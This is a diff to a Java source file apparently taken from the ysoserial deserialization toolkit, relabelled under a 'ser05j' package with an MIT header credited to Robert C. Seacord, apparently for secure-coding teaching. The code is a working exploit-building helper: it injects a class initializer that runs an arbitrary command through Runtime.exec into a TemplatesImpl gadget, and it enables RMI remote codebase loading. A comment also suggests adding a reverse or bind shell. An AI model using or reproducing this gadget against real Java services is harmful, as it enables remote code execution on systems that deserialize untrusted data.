@@ -1,3 +1,25 @@
+// The MIT License (MIT)
+//
+// Copyright (c) 2017 Robert C. Seacord
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy
+// of this software and associated documentation files (the "Software"), to deal
+// in the Software without restriction, including without limitation the rights
+// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+// copies of the Software, and to permit persons to whom the Software is
+// furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all
+// copies or substantial portions of the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
 package ser05j;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
@@ -34,13 +56,13 @@ public class Gadgets {
 
     static {
         // special case for using TemplatesImpl gadgets with a SecurityManager enabled
-        System.setProperty(DESERIALIZE_TRANSLET, "true"); //$NON-NLS-1$
+        System.setProperty(DESERIALIZE_TRANSLET, "true"); 
         
         // for RMI remote loading
-        System.setProperty("java.rmi.server.useCodebaseOnly", "false"); //$NON-NLS-1$ //$NON-NLS-2$
+        System.setProperty("java.rmi.server.useCodebaseOnly", "false");  
     }
 
-    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler"; //$NON-NLS-1$
+    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler"; 
 
     public static class StubTransletPayload extends AbstractTranslet implements Serializable {
 
@@ -48,11 +70,11 @@ public class Gadgets {
 
 
         @Override
-        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}
+        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException { /* empty block */ }
 
 
         @Override
-        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
+        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException { /* empty block */ }
     }
 
     // required to make TemplatesImpl happy
@@ -85,12 +107,12 @@ public class Gadgets {
 
 
     public static Object createTemplatesImpl ( final String command ) throws Exception {
-        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) { //$NON-NLS-1$ //$NON-NLS-2$
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {  
             return createTemplatesImpl(
                 command,
-                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), //$NON-NLS-1$
-                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), //$NON-NLS-1$
-                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")); //$NON-NLS-1$
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), 
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), 
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")); 
         }
 
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
@@ -108,22 +130,22 @@ public class Gadgets {
         final CtClass clazz = pool.get(StubTransletPayload.class.getName());
         // run command in static initializer
         // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+        clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");");   //$NON-NLS-3$ //$NON-NLS-4$
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime()); //$NON-NLS-1$
+        clazz.setName("ysoserial.Pwner" + System.nanoTime()); 
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
 
         final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { //$NON-NLS-1$
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { 
             classBytes, ClassFiles.classAsBytes(Foo.class)
         });
 
         // required to make TemplatesImpl happy
-        Reflections.setFieldValue(templates, "_name", "Pwnr"); //$NON-NLS-1$ //$NON-NLS-2$
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance()); //$NON-NLS-1$
+        Reflections.setFieldValue(templates, "_name", "Pwnr");  
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance()); 
         return templates;
     }
 
@@ -131,13 +153,13 @@ public class Gadgets {
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
             IllegalAccessException, InvocationTargetException {
         HashMap s = new HashMap();
-        Reflections.setFieldValue(s, "size", 2); //$NON-NLS-1$
+        Reflections.setFieldValue(s, "size", 2); 
         Class nodeC;
         try {
-            nodeC = Class.forName("java.util.HashMap$Node"); //$NON-NLS-1$
+            nodeC = Class.forName("java.util.HashMap$Node"); 
         }
-        catch ( ClassNotFoundException e ) {
-            nodeC = Class.forName("java.util.HashMap$Entry"); //$NON-NLS-1$
+        catch (ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry"); 
         }
         Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
         nodeCons.setAccessible(true);
@@ -145,7 +167,7 @@ public class Gadgets {
         Object tbl = Array.newInstance(nodeC, 2);
         Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
-        Reflections.setFieldValue(s, "table", tbl); //$NON-NLS-1$
+        Reflections.setFieldValue(s, "table", tbl); 
         return s;
     }
 }
